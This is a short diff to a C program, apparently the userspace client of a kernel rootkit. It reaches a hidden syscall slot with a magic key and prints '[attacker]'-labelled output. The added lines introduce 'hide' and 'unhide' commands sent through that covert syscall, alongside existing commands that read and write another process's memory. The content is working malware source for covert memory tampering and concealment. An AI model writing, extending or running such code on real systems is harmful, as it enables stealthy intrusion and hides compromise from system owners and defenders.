@@ -17,6 +17,8 @@
 #define RWMEM_CMD_READ  0x1002
 #define RWMEM_CMD_WRITE 0x1003
 #define RWMEM_CMD_CLOSE 0x1004
+#define RWMEM_CMD_HIDE   0x1300
+#define RWMEM_CMD_UNHIDE 0x1301
 #define RWMEM_MAGIC     0x53434831UL /* Kerncall SC_MAGIC */
 
 static const int empty_slots[] = {
@@ -71,6 +73,20 @@ int main(int argc, char **argv)
 		return 1;
 	}
 	printf("[attacker] slot: %ld\n", slot);
+
+	if (argc >= 4) {
+		long cmd;
+
+		if (!strcmp(argv[3], "hide"))
+			cmd = RWMEM_CMD_HIDE;
+		else if (!strcmp(argv[3], "unhide"))
+			cmd = RWMEM_CMD_UNHIDE;
+		else
+			return 1;
+		printf("[attacker] %s: %ld\n", argv[3],
+		       syscall(slot, RWMEM_KEY, cmd, 0, 0, 0, 0));
+		return 0;
+	}
 
 	handle = syscall(slot, RWMEM_KEY, RWMEM_CMD_OPEN, pid, 0, 0, 0);
 	if (handle < 0) {
